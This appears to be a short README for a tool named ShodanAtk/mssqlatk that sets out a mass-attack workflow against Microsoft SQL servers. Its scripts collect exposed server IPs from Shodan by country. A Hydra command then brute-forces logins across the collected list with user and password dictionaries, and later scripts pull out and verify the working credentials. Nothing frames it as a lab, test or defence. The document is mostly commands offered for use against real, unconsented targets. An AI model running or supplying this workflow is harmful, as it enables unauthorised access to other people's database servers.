# ShodanAtk
## mssqlatk

### Setup your own api_key
00mssqltopcountry.py(optional)&01mssqlcollector.py

### Top 50 country
c:\mssql\> 00mssqltopcountry.py \> mssqltop50.txt

### Collector ip list
c:\mssql\> 01mssqlcollector.py 1 30

### Hydra Attack
root@kali2016:~/mssql# hydra -L sqluser.dic -P sqlpass.dic -t 30 -M ip.txt mssql

### Extractor mssql list
c:\mssql\> 02mssqlextractor.py iprst.txt \> mssql.txt

### Check mssql
c:\mssql\> 03mssqlchecker.py mssql.txt \> mssqlstatus.txt

